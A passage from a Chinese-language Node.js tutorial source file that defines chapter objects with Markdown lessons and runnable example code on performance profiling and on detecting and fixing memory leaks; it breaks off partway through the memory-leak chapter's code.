// =============================================================
// Node.js 交互式教程 —— 第八批章节（共 6 章）
// -------------------------------------------------------------
// 本文件包含以下章节：
//   1. node-profiling    — 性能分析与优化
//   2. node-memory-leak  — 内存泄漏检测与修复
//   3. node-security     — 安全最佳实践
//   4. node-caching      — 缓存策略
//   5. node-database     — 数据库集成
//   6. node-message-queue — 消息队列
//
// 每个章节包含：
//   id      : 唯一标识
//   title   : 章节标题
//   icon    : 展示用 emoji
//   group   : 分组名
//   content : Markdown 格式的详细讲解（文字量是普通教程的 5 倍）
//   code    : 可运行、带详细中文注释的示例代码
//
// 代码运行环境约束：
//   - Node.js vm 沙箱，5 秒超时
//   - 仅可 require: fs, path, os, url, crypto, util, events, stream,
//     buffer, querystring, string_decoder, zlib, assert, timers
//   - 全局可用: console, process, Buffer, setTimeout, setInterval,
//     setImmediate, clearTimeout, clearInterval, clearImmediate,
//     URL, URLSearchParams, TextEncoder, TextDecoder, Promise,
//     __dirname, __filename, require, module, exports
// =============================================================

export const chapters = [
  // =========================================================
  // 第一章：性能分析与优化
  // =========================================================
  {
    id: "node-profiling",
    title: "性能分析与优化",
    icon: "📊",
    group: "进阶实战补充",
    content: `## 为什么性能分析重要？

在 Node.js 应用开发中，性能问题往往不是一开始就能发现的。一个应用在开发环境表现良好，但到了生产环境面对数千并发请求时，可能突然变得缓慢甚至崩溃。**性能分析（Profiling）是发现和解决这些问题的科学方法**——它不是靠猜测，而是靠数据驱动。

### 性能优化的黄金法则

在开始任何优化之前，请记住这条黄金法则：

> **不要猜测（Don't Guess）——用数据说话！**

很多开发者凭直觉优化代码，比如"把 for 循环改成 while 应该更快"，或者"用位运算替代乘法"。但在现代 JavaScript 引擎（V8）中，这些"微优化"通常毫无意义——V8 已经在内部做了大量优化。**真正有效的性能分析需要测量工具和量化数据**。

---

## 性能分析流程

一个完整的性能分析流程通常包含以下步骤：

1. **建立基准（Baseline）**：在优化前记录当前性能数据，作为后续对比的基准。
2. **识别瓶颈（Bottleneck）**：用工具找到最耗时的代码路径。通常 80% 的时间花在 20% 的代码上（帕累托原则）。
3. **提出假设（Hypothesis）**：基于数据提出优化方案，如"缓存计算结果"、"减少 I/O 次数"、"使用流式处理"。
4. **实施优化（Implement）**：修改代码。
5. **验证效果（Verify）**：再次测量，对比基准数据，确认优化是否有效。
6. **防止回退（Regression）**：将性能测试加入 CI/CD 流程，防止后续变更引入性能回退。

---

## console.time / console.timeEnd —— 最简单的计时工具

这是最直观的性能测量方式，适合快速定位单个操作的耗时。

\`\`\`javascript
// 开始计时，标签为 'my-operation'
console.time('my-operation');

// 执行一些操作...
for (let i = 0; i < 1000000; i++) {
  // 模拟耗时操作
}

// 结束计时并输出
console.timeEnd('my-operation');
// 输出: my-operation: 3.456ms
\`\`\`

**进阶用法**：

- \`console.timeLog(label)\`：在计时过程中输出当前耗时（不结束计时），适合查看分段耗时。
- 多个标签可以同时进行，互不干扰。
- 标签名区分大小写，\`'query'\` 和 \`'Query'\` 是不同的计时器。

**局限性**：
- 精度有限（毫秒级），不适合微秒级测量。
- 只能测量同步代码，异步代码需要手动管理。
- 在生产环境中，过多的 console.time 调用本身也会带来开销。

---

## performance.now() —— 高精度计时

\`performance.now()\` 返回一个高精度的时间戳（微秒级精度），是进行精确性能测量的首选工具。

\`\`\`javascript
const start = performance.now();

// 执行被测代码
doSomething();

const end = performance.now();
console.log(\`耗时: \${(end - start).toFixed(3)} ms\`);
\`\`\`

**与 Date.now() 的对比**：

| 特性 | Date.now() | performance.now() |
| --- | --- | --- |
| **精度** | 毫秒级（1ms） | 微秒级（5μs 典型值） |
| **基准点** | 1970-01-01（Unix 纪元） | 页面加载/进程启动时刻 |
| **单调性** | 不保证（可能被系统时间调整影响） | 单调递增，不受系统时间调整影响 |
| **受 NTP 影响** | 是 | 否 |
| **用途** | 获取当前时间 | 测量时间间隔 |

**关键点**：\`performance.now()\` 是**单调时钟**——它只会向前走，不会因为系统时间被手动调整或 NTP 同步而出现倒退。这使得它非常适合测量时间间隔。

---

## V8 引擎的 --prof 日志

Node.js 内置了 V8 引擎的性能分析工具。通过 \`--prof\` 标志启动 Node.js，V8 会在进程退出时生成一个日志文件（通常是 \`isolate-0xXXXXXXXX-v8.log\`）。

\`\`\`bash
# 启动时启用 prof 日志
node --prof app.js

# 生成日志文件后，用 --prof-process 处理
node --prof-process isolate-*.log > processed.txt
\`\`\`

处理后的日志包含以下关键信息：

- **Shared libraries**：共享库的 CPU 占用
- **JavaScript**：各函数的 CPU 时间占比
- **C++**：C++ 代码的 CPU 占用
- **GC（垃圾回收）**：垃圾回收的 CPU 占用
- **Summary**：总览

\`\`\`
[JavaScript]:
   ticks  total  nonlib   name
   1234   45.2%   50.1%   LazyCompile: *expensiveFunction /app.js:42
    567   20.8%   23.1%   LazyCompile: *processData /app.js:78
\`\`\`

**重要概念**：
- **ticks**：采样次数，代表该函数被采样到的频率。
- **LazyCompile**：V8 的延迟编译优化，表示该函数被 V8 认为是"热点"。
- **Optimized**：该函数已经被 V8 的 TurboFan 编译器优化。
- **Deoptimized**：函数曾被优化，但后来因为某些原因被去优化了（需要重点关注）。

---

## 火焰图（Flame Graph）

火焰图是由 Brendan Gregg 发明的一种性能分析可视化工具。它把调用栈和 CPU 时间结合起来，用颜色和宽度表示不同函数的耗时。

一个典型的火焰图：
- **X 轴**：按字母顺序排列（不是时间顺序），宽度代表 CPU 时间占比。
- **Y 轴**：调用栈深度，从下往上是调用关系（底部是调用者，顶部是被调用者）。
- **颜色**：通常是随机暖色，用于区分不同的函数。

**如何阅读火焰图**：
- 寻找**"平顶山"**（Platform）：一个很宽的矩形在顶部，说明某个函数自身消耗了大量 CPU 时间。
- 寻找**"密集的塔"**（Tower）：很高的调用栈，说明递归或深层调用问题。
- 关注**绿色/特殊的颜色**：通常代表 GC、系统调用等。

在 Node.js 中生成火焰图，常用工具：
- **0x**：一个简单的火焰图生成工具，一行命令即可。
- **Clinic.js**：Node.js 官方推荐的性能诊断工具套件。
- **Node.js --profile** + Chrome DevTools。

---

## Benchmark.js 概念

Benchmark.js 是一个高精度的 JavaScript 基准测试库。它解决了手动计时的一些常见问题：

1. **预热（Warm-up）**：在正式测试前先运行几次，让 V8 的 JIT 编译器有足够时间优化代码。
2. **多次迭代**：运行足够多次以获得统计显著的结果。
3. **误差范围**：报告 ± 误差范围，而不是给一个绝对值。
4. **竞争比较**：自动比较多个方案，给出相对速度。

\`\`\`javascript
const Benchmark = require('benchmark');
const suite = new Benchmark.Suite;

suite
  .add('RegExp#test', function() {
    /o/.test('Hello World!');
  })
  .add('String#indexOf', function() {
    'Hello World!'.indexOf('o') > -1;
  })
  .on('cycle', function(event) {
    console.log(String(event.target));
  })
  .on('complete', function() {
    console.log('最快的是: ' + this.filter('fastest').map('name'));
  })
  .run({ 'async': true });
\`\`\`

---

## 常见性能瓶颈

### 1. 同步阻塞操作

最大的性能杀手。在事件循环中使用阻塞操作（如 \`fs.readFileSync\`、\`crypto.pbkdf2Sync\`）会阻塞整个主线程。

### 2. 内存泄漏

未被释放的对象持续占用内存，导致 GC 越来越频繁，最终拖垮性能。详见下一章。

### 3. 过多的对象创建

频繁创建大量临时对象，给 GC 造成压力。

\`\`\`javascript
// ❌ 坏：每次循环创建新对象
for (let i = 0; i < 1000000; i++) {
  const temp = { x: i, y: i * 2 };
  processPoint(temp);
}

// ✅ 好：复用对象
const point = { x: 0, y: 0 };
for (let i = 0; i < 1000000; i++) {
  point.x = i;
  point.y = i * 2;
  processPoint(point);
}
\`\`\`

### 4. 深层嵌套回调中的重复计算

每次回调都重新计算相同的结果，浪费 CPU。

### 5. 未优化的数据库查询

N+1 查询问题：循环中逐条查询数据库，而不是批量查询。

### 6. 不恰当的 JSON 序列化/反序列化

\`JSON.stringify()\` 和 \`JSON.parse()\` 是 CPU 密集型操作，大对象上尤其明显。

### 7. 正则表达式性能问题（ReDoS）

灾难性回溯可能导致 CPU 100% 占用，详见安全章节。

### 8. 事件循环延迟

如果一个同步操作执行时间超过 50ms，用户就会感知到明显的延迟。

---

## 性能优化策略总结

| 策略 | 适用场景 | 效果 |
| --- | --- | --- |
| **缓存** | 计算结果可复用 | 极高 |
| **批处理** | 多次数据库/网络请求 | 高 |
| **流式处理** | 大文件处理 | 高 |
| **异步非阻塞** | I/O 密集型操作 | 极高 |
| **Worker Threads** | CPU 密集型任务 | 高 |
| **对象复用** | 高频创建对象 | 中 |
| **算法优化** | 复杂度高的问题 | 取决于具体问题 |
| **连接池** | 数据库/网络连接 | 高 |

下面这段代码演示了多种性能测量和优化技术。`,
    code: `// ============================================================
// 第一章代码演示：性能分析与优化
// ============================================================

// ---- 1. console.time / console.timeEnd 基本用法 ----
console.log("===== 1. console.time/timeEnd 基本用法 =====");
console.time("循环100万次");
let sum = 0;
for (let i = 0; i < 1000000; i++) {
  sum += i;
}
console.timeEnd("循环100万次");
console.log("求和结果:", sum);

// 多个计时器同时进行
console.time("字符串拼接");
let str = "";
for (let i = 0; i < 100000; i++) {
  str += "a";
}
console.timeEnd("字符串拼接");

console.time("数组push");
const arr = [];
for (let i = 0; i < 100000; i++) {
  arr.push(i);
}
console.timeEnd("数组push");

// ---- 2. performance.now() 高精度计时 ----
console.log("\\n===== 2. performance.now() 高精度计时 =====");
const start = performance.now();
let result = 0;
for (let i = 0; i < 5000000; i++) {
  result += Math.sqrt(i);
}
const end = performance.now();
console.log("performance.now 测得耗时:", (end - start).toFixed(3), "ms");
console.log("计算 sqrt 总和:", result.toFixed(2));

// ---- 3. 对比不同算法性能 ----
console.log("\\n===== 3. 对比不同算法性能 =====");

// 数组去重：Set vs filter+indexOf
function benchmark(name, fn, iterations) {
  const start = performance.now();
  for (let i = 0; i < iterations; i++) {
    fn();
  }
  const elapsed = performance.now() - start;
  return { name, elapsed, iterations };
}

// 生成测试数据
const testArray = Array.from({ length: 5000 }, () => Math.floor(Math.random() * 2000));

// 方案1：使用 Set 去重
const result1 = benchmark(
  "Set 去重",
  () => {
    const unique = [...new Set(testArray)];
    return unique;
  },
  500
);

// 方案2：使用 filter + indexOf 去重
const result2 = benchmark(
  "filter + indexOf 去重",
  () => {
    const unique = testArray.filter((item, index) => testArray.indexOf(item) === index);
    return unique;
  },
  500
);

// 方案3：使用 reduce 去重
const result3 = benchmark(
  "reduce 去重",
  () => {
    const unique = testArray.reduce((acc, item) => {
      if (!acc.includes(item)) acc.push(item);
      return acc;
    }, []);
    return unique;
  },
  500
);

console.log("\\n去重性能对比（500次迭代，数组长度5000）:");
console.table([
  { 方案: result1.name, "耗时(ms)": result1.elapsed.toFixed(2) },
  { 方案: result2.name, "耗时(ms)": result2.elapsed.toFixed(2) },
  { 方案: result3.name, "耗时(ms)": result3.elapsed.toFixed(2) },
]);

// ---- 4. 对比字符串拼接方式 ----
console.log("\\n===== 4. 字符串拼接性能对比 =====");

// 方案1：+ 操作符拼接
const strPlusResult = benchmark(
  "+ 拼接",
  () => {
    let s = "";
    for (let i = 0; i < 5000; i++) {
      s += "item" + i + ",";
    }
    return s;
  },
  200
);

// 方案2：数组 join 拼接
const strJoinResult = benchmark(
  "数组 join 拼接",
  () => {
    const arr = [];
    for (let i = 0; i < 5000; i++) {
      arr.push("item" + i);
    }
    return arr.join(",");
  },
  200
);

// 方案3：模板字面量拼接
const strTemplateResult = benchmark(
  "模板字面量拼接",
  () => {
    let s = "";
    for (let i = 0; i < 5000; i++) {
      s += \`item\${i},\`;
    }
    return s;
  },
  200
);

console.log("字符串拼接性能对比（200次迭代，每次拼接5000个元素）:");
console.table([
  { 方案: strPlusResult.name, "耗时(ms)": strPlusResult.elapsed.toFixed(2) },
  { 方案: strJoinResult.name, "耗时(ms)": strJoinResult.elapsed.toFixed(2) },
  { 方案: strTemplateResult.name, "耗时(ms)": strTemplateResult.elapsed.toFixed(2) },
]);

// ---- 5. 实现简易基准测试框架 ----
console.log("\\n===== 5. 简易基准测试框架 =====");

class SimpleBenchmark {
  constructor() {
    this.tests = [];
  }

  // 注册测试用例
  add(name, fn) {
    this.tests.push({ name, fn });
    return this;
  }

  // 运行所有测试
  run(options = {}) {
    const { iterations = 1000, warmup = 10 } = options;
    const results = [];

    for (const test of this.tests) {
      // 预热阶段：让 V8 优化代码
      for (let i = 0; i < warmup; i++) {
        test.fn();
      }

      // 正式测试
      const start = performance.now();
      for (let i = 0; i < iterations; i++) {
        test.fn();
      }
      const totalTime = performance.now() - start;
      const opsPerSec = (iterations / totalTime) * 1000;

      results.push({
        name: test.name,
        totalTime: totalTime,
        opsPerSec: opsPerSec,
        avgTime: totalTime / iterations,
      });
    }

    // 排序：按每秒操作数降序
    results.sort((a, b) => b.opsPerSec - a.opsPerSec);

    return results;
  }
}

// 使用基准测试框架比较不同排序算法
const suite = new SimpleBenchmark();

// 生成随机数组
const randomArray = Array.from({ length: 1000 }, () => Math.floor(Math.random() * 10000));

suite
  .add("Array.sort() 默认排序", () => {
    const arr = [...randomArray];
    arr.sort((a, b) => a - b);
  })
  .add("冒泡排序", () => {
    const arr = [...randomArray];
    const n = arr.length;
    for (let i = 0; i < n - 1; i++) {
      for (let j = 0; j < n - i - 1; j++) {
        if (arr[j] > arr[j + 1]) {
          [arr[j], arr[j + 1]] = [arr[j + 1], arr[j]];
        }
      }
    }
  })
  .add("选择排序", () => {
    const arr = [...randomArray];
    const n = arr.length;
    for (let i = 0; i < n - 1; i++) {
      let minIdx = i;
      for (let j = i + 1; j < n; j++) {
        if (arr[j] < arr[minIdx]) minIdx = j;
      }
      if (minIdx !== i) {
        [arr[i], arr[minIdx]] = [arr[minIdx], arr[i]];
      }
    }
  })
  .add("插入排序", () => {
    const arr = [...randomArray];
    const n = arr.length;
    for (let i = 1; i < n; i++) {
      const key = arr[i];
      let j = i - 1;
      while (j >= 0 && arr[j] > key) {
        arr[j + 1] = arr[j];
        j--;
      }
      arr[j + 1] = key;
    }
  });

const results = suite.run({ iterations: 100, warmup: 5 });

console.log("排序算法性能对比（100次迭代，数组长度1000）:");
console.table(
  results.map((r) => ({
    算法: r.name,
    "总耗时(ms)": r.totalTime.toFixed(3),
    "操作/秒": r.opsPerSec.toFixed(0),
    "平均(ms)": r.avgTime.toFixed(4),
  }))
);

// 找出最快/最慢
const fastest = results[0];
const slowest = results[results.length - 1];
console.log(
  "\\n最快的算法: " + fastest.name + " (比最慢的快 " + (slowest.opsPerSec > 0 ? (fastest.opsPerSec / slowest.opsPerSec).toFixed(1) : "N/A") + " 倍)"
);

// ---- 6. 对象复用 vs 每次创建新对象 ----
console.log("\\n===== 6. 对象复用 vs 每次创建新对象 =====");

function processPoint(p) {
  return p.x * p.x + p.y * p.y;
}

// 方案1：每次创建新对象
const createNewResult = benchmark(
  "每次创建新对象",
  () => {
    let total = 0;
    for (let i = 0; i < 100000; i++) {
      const point = { x: i, y: i * 2 };
      total += processPoint(point);
    }
    return total;
  },
  50
);

// 方案2：复用对象
const reuseResult = benchmark(
  "复用同一对象",
  () => {
    const point = { x: 0, y: 0 };
    let total = 0;
    for (let i = 0; i < 100000; i++) {
      point.x = i;
      point.y = i * 2;
      total += processPoint(point);
    }
    return total;
  },
  50
);

console.log("对象创建性能对比（50次，每次10万次循环）:");
console.table([
  { 方案: createNewResult.name, "耗时(ms)": createNewResult.elapsed.toFixed(2) },
  { 方案: reuseResult.name, "耗时(ms)": reuseResult.elapsed.toFixed(2) },
]);

// ---- 7. 缓存优化：斐波那契数列 ----
console.log("\\n===== 7. 缓存优化：斐波那契数列 =====");

// 无缓存版本（指数级复杂度）
function fibNoCache(n) {
  if (n <= 1) return n;
  return fibNoCache(n - 1) + fibNoCache(n - 2);
}

// 带缓存版本（线性复杂度）
function fibWithCache(n, cache = {}) {
  if (n <= 1) return n;
  if (cache[n] !== undefined) return cache[n];
  cache[n] = fibWithCache(n - 1, cache) + fibWithCache(n - 2, cache);
  return cache[n];
}

const n = 35;
console.log("计算 fib(" + n + "):");

const fibNoCacheResult = benchmark("无缓存递归", () => fibNoCache(n), 1);
const fibCacheResult = benchmark("带缓存递归", () => fibWithCache(n), 1);

console.log("无缓存版本耗时:", fibNoCacheResult.elapsed.toFixed(2), "ms");
console.log("带缓存版本耗时:", fibCacheResult.elapsed.toFixed(2), "ms");
console.log("缓存加速比:", (fibNoCacheResult.elapsed / fibCacheResult.elapsed).toFixed(0) + "x");

// ---- 8. 性能分析总结 ----
console.log("\\n===== 8. 性能分析总结 =====");
const tips = [
  "1. 先用工具测量，再优化——凭直觉优化往往是浪费时间",
  "2. 关注真正的瓶颈——80%时间花在20%代码上",
  "3. 缓存是性能优化的银弹——空间换时间",
  "4. 避免在循环中创建大量临时对象",
  "5. 选择合适的算法——O(n²)和O(n log n)差距巨大",
  "6. 异步非阻塞是Node.js的灵魂——不要在事件循环中阻塞",
  "7. 字符串拼接用数组 join 通常比 + 更快",
  "8. 使用 Set/Map 替代 Array 进行查找操作",
  "9. 定期进行性能回归测试，防止性能回退",
];
tips.forEach((tip) => console.log("  " + tip));`,
  },

  // =========================================================
  // 第二章：内存泄漏检测与修复
  // =========================================================
  {
    id: "node-memory-leak",
    title: "内存泄漏检测与修复",
    icon: "💧",
    group: "进阶实战补充",
    content: `## 什么是内存泄漏？

内存泄漏（Memory Leak）是指程序中**不再需要使用的内存没有被释放**，导致内存占用持续增长，最终可能导致应用崩溃或系统变慢。

在 JavaScript 中，垃圾回收（GC）是自动的，但这并不意味着不会发生内存泄漏。GC 只能回收"不可达"的对象——如果一个对象虽然不再被业务逻辑需要，但仍被某个引用链持有，GC 就无法回收它。

---

## 内存泄漏的常见原因

### 1. 全局变量

在 Node.js 中，全局变量（直接挂载到 \`global\` 或无意中创建的全局变量）在整个应用生命周期内都不会被回收。

\`\`\`javascript
// ❌ 无意中创建全局变量
function processData() {
  data = fetchData();  // 忘记 var/let/const，data 变成全局变量！
}

// ❌ 显式挂载到 global
global.cache = new Map();  // 永远不清理，持续增长

// ✅ 正确做法：使用局部变量
function processData() {
  const data = fetchData();  // 函数执行完后 data 可被回收
  return process(data);
}
\`\`\`

**检测技巧**：在 Node.js 模块中，用 \`'use strict'\` 可以防止无意中创建全局变量。

### 2. 闭包（Closure）

闭包本身是 JavaScript 的强大特性，但如果不小心，闭包会持有对不再需要的大对象的引用。

\`\`\`javascript
// ❌ 闭包泄漏：回调持有对大对象的引用
function createHandler() {
  const largeData = new Array(1000000).fill('x');  // 大对象
  return function handler() {
    // 即使 handler 中只用到了 largeData 的一小部分
    // 整个 largeData 也无法被回收，因为闭包持有它的引用
    console.log(largeData[0]);
  };
}

// ✅ 改进：只保留需要的数据
function createHandler() {
  const firstItem = new Array(1000000).fill('x')[0];
  return function handler() {
    console.log(firstItem);
  };
}
\`\`\`

### 3. 事件监听器（Event Listeners）

注册了事件监听器但忘记移除，是 Node.js 中非常常见的内存泄漏来源。

\`\`\`javascript
const EventEmitter = require('events');

// ❌ 泄漏：监听器永远不会被移除
class LeakyService {
  constructor(emitter) {
    emitter.on('data', (data) => {
      this.process(data);  // this 被 emitter 引用，无法被 GC
    });
  }
}

// ✅ 正确：提供清理方法
class CleanService {
  constructor(emitter) {
    this.emitter = emitter;
    this.handler = (data) => this.process(data);
    emitter.on('data', this.handler);
  }

  destroy() {
    this.emitter.off('data', this.handler);  // 移除监听器
  }
}
\`\`\`

**关键原则**：谁注册的监听器，谁负责移除。使用 \`emitter.once()\` 替代 \`emitter.on()\` 可以避免手动移除。

### 4. 定时器（Timers）

\`setInterval\` 和 \`setTimeout\` 如果不清理，会持有回调函数的引用，阻止相关对象被回收。

\`\`\`javascript
// ❌ 泄漏：定时器持有对大对象的引用
class PollingService {
  constructor() {
    this.largeCache = new Array(1000000);
    this.timer = setInterval(() => {
      this.poll();  // largeCache 和 PollingService 实例都无法被回收
    }, 1000);
  }
}

// ✅ 正确：提供清除方法
class SafePollingService {
  constructor() {
    this.largeCache = new Array(1000000);
    this.timer = setInterval(() => this.poll(), 1000);
  }

  destroy() {
    clearInterval(this.timer);
    this.largeCache = null;  // 释放引用
  }
}
\`\`\`

### 5. 未清理的 Map/Set/缓存

使用 Map 或对象作为缓存，但不限制大小或设置过期时间，会导致内存无限增长。

---

## process.memoryUsage() —— 内存监控

\`process.memoryUsage()\` 返回当前 Node.js 进程的内存使用情况：

| 属性 | 说明 |
| --- | --- |
| \`rss\` | Resident Set Size，常驻内存集合（物理内存占用） |
| \`heapTotal\` | V8 堆的总量（已申请的内存） |
| \`heapUsed\` | V8 堆的实际使用量 |
| \`external\` | V8 管理的 C++ 对象占用的内存（如 Buffer） |
| \`arrayBuffers\` | ArrayBuffer 和 SharedArrayBuffer 占用的内存 |

\`\`\`javascript
const mem = process.memoryUsage();
console.log('堆内存使用:', (mem.heapUsed / 1024 / 1024).toFixed(2), 'MB');
console.log('堆内存总量:', (mem.heapTotal / 1024 / 1024).toFixed(2), 'MB');
console.log('物理内存(RSS):', (mem.rss / 1024 / 1024).toFixed(2), 'MB');
\`\`\`

**监控技巧**：
- 定期调用 \`process.memoryUsage()\` 并记录，观察 \`heapUsed\` 是否持续增长。
- 如果 \`heapUsed\` 持续增长且不回落，很可能是内存泄漏。

---

## WeakMap / WeakSet —— 弱引用解决方案

\`WeakMap\` 和 \`WeakSet\` 是 ES6 引入的"弱引用"集合，它们的键是弱引用的——如果键对象没有被其他地方引用，GC 就可以回收它，对应的条目也会自动从 WeakMap/WeakSet 中移除。

**WeakMap 的特性**：
- 键必须是对象（不能是原始类型）。
- 不可枚举（没有 \`size\`、\`forEach\`、\`keys()\` 等）。
- 键被 GC 回收后，条目自动消失。

**典型应用场景**：

\`\`\`javascript
// 用 WeakMap 存储私有数据
const privateData = new WeakMap();

class User {
  constructor(name) {
    privateData.set(this, { name, createdAt: Date.now() });
    // 当 User 实例被回收时，privateData 中的条目也会自动清理
  }

  getName() {
    return privateData.get(this).name;
  }
}
\`\`\`

\`\`\`javascript
// 用 WeakMap 实现缓存，避免内存泄漏
const cache = new WeakMap();

function processObject(obj) {
  if (cache.has(obj)) return cache.get(obj);
  const result = expensiveComputation(obj);
  cache.set(obj, result);
  return result;
  // 当 obj 被回收时，缓存条目也会自动清理——不用担心缓存泄漏！
}
\`\`\`

---

## 内存泄漏检测工具

### 1. Node.js 内置 --inspect

\`\`\`bash
node --inspect app.js
\`\`\`

然后在 Chrome 浏览器中打开 \`chrome://inspect\`，使用 Memory 面板进行堆快照（Heap Snapshot）对比。拍摄两张快照（间隔一段时间），对比它们之间的差异，找出持续增长的对象。

### 2. heapdump 模块

\`\`\`bash
npm install heapdump
\`\`\`

\`\`\`javascript
const heapdump = require('heapdump');
// 在需要时生成堆快照
heapdump.writeSnapshot('/tmp/heap-' + Date.now() + '.heapsnapshot');
\`\`\`

生成的 \`.heapsnapshot\` 文件可以在 Chrome DevTools 中打开分析。

### 3. Clinic.js

Node.js 官方的性能诊断工具套件，包含：
- **Clinic Doctor**：综合诊断，包括内存使用分析。
- **Clinic HeapProfiler**：专门的内存分析工具。

### 4. 内存泄漏检测模式

观察内存是否泄漏的简单方法：在一个循环中执行操作，监控 \`heapUsed\`：

\`\`\`javascript
let lastHeapUsed = 0;
setInterval(() => {
  const { heapUsed } = process.memoryUsage();
  const diff = heapUsed - lastHeapUsed;
  if (diff > 0) {
    console.log(\`内存增长: +\${(diff / 1024).toFixed(2)} KB\`);
  }
  lastHeapUsed = heapUsed;
}, 1000);
\`\`\`

---

## 内存泄漏修复策略

1. **找到泄漏源**：使用堆快照对比，定位持续增长的对象类型。
2. **分析引用链**：查看是谁持有这些对象的引用。
3. **修复引用**：移除不必要的引用（如清理事件监听器、清除定时器）。
4. **使用弱引用**：对于缓存场景，考虑使用 WeakMap/WeakSet。
5. **限制缓存大小**：使用 LRU 缓存策略，限制最大条目数。
6. **验证修复**：再次拍摄堆快照，确认内存不再增长。

下面这段代码模拟了 4 种内存泄漏场景及其修复方案。`,
    code: `// ============================================================
// 第二章代码演示：内存泄漏检测与修复
// ============================================================

// ---- 1. process.memoryUsage 监控内存 ----
console.log("===== 1. process.memoryUsage 监控内存 =====");

function printMemory(label) {
  const mem = process.memoryUsage();
  console.log(
    "[" + label + "] " +
    "heapUsed: " + (mem.heapUsed / 1024 / 1024).toFixed(2) + " MB | " +
    "heapTotal: " + (mem.heapTotal / 1024 / 1024).toFixed(2) + " MB | " +
    "rss: " + (mem.rss / 1024 / 1024).toFixed(2) + " MB | " +
    "external: " + (mem.external / 1024 / 1024).toFixed(2) + " MB"
  );
}

printMemory("程序启动时");

// ---- 2. 模拟场景1：全局变量泄漏 ----
console.log("\\n===== 2. 场景1：全局变量泄漏 =====");

// ❌ 泄漏版本：数据挂在 global 上，永远不会被回收
function leakyGlobalCache() {
  // 模拟往全局缓存中不断添加数据
  if (!global.leakyCache) {
    global.leakyCache = [];
  }
  // 每次调用添加 10000 个条目
  for (let i = 0; i < 10000; i++) {
    global.leakyCache.push({
      id: i,
      data: "x".repeat(100),  // 每条数据约100字节
      timestamp: Date.now(),
    });
  }
}

// 执行几次泄漏操作
leakyGlobalCache();
leakyGlobalCache();
printMemory("全局变量泄漏后");
console.log("global.leakyCache 条目数:", global.leakyCache.length);

// ✅ 修复：使用局部变量，函数执行完即可被回收
function fixedLocalCache() {
  const localCache = [];  // 局部变量，函数执行完后可被 GC
  for (let i = 0; i < 10000; i++) {
    localCache.push({ id: i, data: "x".repeat(100) });
  }
  return localCache.length;  // 返回后 localCache 不再被引用
}

fixedLocalCache();
fixedLocalCache();
printMemory("使用局部变量后（内存稳定）");

// 清理全局泄漏
delete global.leakyCache;

// ---- 3. 模拟场景2：闭包泄漏 ----
console.log("\\n===== 3. 场景2：闭包泄漏 =====");

// ❌ 泄漏版本：闭包持有整个大对象
function createLeakyClosure() {
  const largeData = new Array(50000).fill("大数据块");
  return function () {
    // 只用到了 largeData 的第一个元素
    // 但整个 largeData 数组都无法被回收！
    return largeData[0];
  };
}

const leakyFuncs = [];
for (let i = 0; i < 20; i++) {
  leakyFuncs.push(createLeakyClosure());
}
printMemory("闭包泄漏后");
console.log("创建了 20 个持有大对象的闭包");

// ✅ 修复：只保留需要的数据
function createFixedClosure() {
  const firstItem = new Array(50000).fill("大数据块")[0];
  return function () {
    return firstItem;  // 只持有 firstItem，大数组已被回收
  };
}

const fixedFuncs = [];
for (let i = 0; i < 20; i++) {
  fixedFuncs.push(createFixedClosure());
}
printMemory("修复闭包后（只保留需要的数据）");

// 清理
leakyFuncs.length = 0;
fixedFuncs.length = 0;

// ---- 4. 模拟场景3：事件监听器泄漏 ----
console.log("\\n===== 4. 场景3：事件监听器泄漏 =====");

const EventEmitter = require("events");
const emitter = new EventEmitter();

// ❌ 泄漏版本：监听器注册了但从不移除
const leakyListeners = [];
function createLeakyListener() {
  const handler = (data) => {
    // 闭包引用了 handler 所在的作用域
    console.log("处理数据:", data.slice(0, 10));
  };
  emitter.on("leaky-data", handler);
  leakyListeners.push(handler);  // 仅用于追踪
}

// 创建 50 个监听器
for (let i = 0; i < 50; i++) {
  createLeakyListener();
}
console.log("注册了 50 个事件监听器");
console.log("emitter 上 'leaky-data' 监听器数量:", emitter.listenerCount("leaky-data"));

// ✅ 修复：使用 once 或手动移除
function createSafeListener() {
  const handler = (data) => {
    console.log("安全处理:", data.slice(0, 10));
    // 处理完后移除自己
    emitter.off("safe-data", handler);
  };
  emitter.on("safe-data", handler);
}

// 创建并自动清理
for (let i = 0; i < 50; i++) {
  createSafeListener();
}
// 触发事件，每个监听器执行一次后自动移除
emitter.emit("safe-data", "测试数据" + "x".repeat(100));
console.log("触发事件后，'safe-data' 监听器数量:", emitter.listenerCount("safe-data"));

// 清理泄漏的监听器
emitter.removeAllListeners("leaky-data");

// ---- 5. 模拟场景4：定时器泄漏 ----
console.log("\\n===== 5. 场景4：定时器泄漏 =====");

// ❌ 泄漏版本：定时器持有大对象引用
function createLeakyTimer() {
  const largeData = new Array(100000).fill("定时器数据");
  const timer = setInterval(() => {
    // 定时器回调持有 largeData 的引用
    // 即使我们不再需要 largeData，它也无法被回收
    if (largeData.length > 0) {
      // 什么都不做，只是为了持有引用
    }
  }, 10000);
  return timer;
}

const leakyTimers = [];
for (let i = 0; i < 10; i++) {
  leakyTimers.push(createLeakyTimer());
}
printMemory("定时器泄漏后");
console.log("创建了 10 个泄漏的定时器");

// 清理泄漏的定时器
leakyTimers.forEach((t) => clearInterval(t));
leakyTimers.length = 0;

// ✅ 修复：提供清理机制
class SafeTimerManager {
  constructor() {
    this.timers = new Set();
  }

  createInterval(fn, interval) {
    const timer = setInterval(fn, interval);
    this.timers.add(timer);
    return timer;
  }

  clearTimer(timer) {
    clearInterval(timer);
    this.timers.delete(timer);
  }

  destroy() {
    for (const timer of this.timers) {
      clearInterval(timer);
    }
    this.timers.clear();
  }
}

const manager = new SafeTimerManager();
const t1 = manager.createInterval(() => {}, 10000);
const t2 = manager.createInterval(() => {}, 10000);
console.log("安全定时器管理器创建了 2 个定时器");
manager.destroy();
console.log("调用 destroy() 后，所有定时器已清理");
printMemory("定时器清理后");

// ---- 6. WeakMap 解决缓存泄漏 ----
console.log("\\n===== 6. WeakMap 解决缓存泄漏 =====");

// ❌ 普通 Map 缓存：键对象被回收后，缓存条目不会自动清理
const normalCache = new Map();

function processWithNormalCache(obj) {
  if (normalCache.has(obj)) {
    return normalCache.get(obj);
  }
  const result = { processed: true, data: obj.name, time: Date.now() };
  normalCache.set(obj, result);
  return result;
}

// 使用普通 Map 缓存
let obj1 = { name: "对象A", data: "x".repeat(1000) };
let obj2 = { name: "对象B", data: "x".repeat(1000) };
processWithNormalCache(obj1);
processWithNormalCache(obj2);
console.log("普通 Map 缓存条目数:", normalCache.size);

// 即使我们将 obj1 设为 null，Map 中的条目仍然存在
obj1 = null;
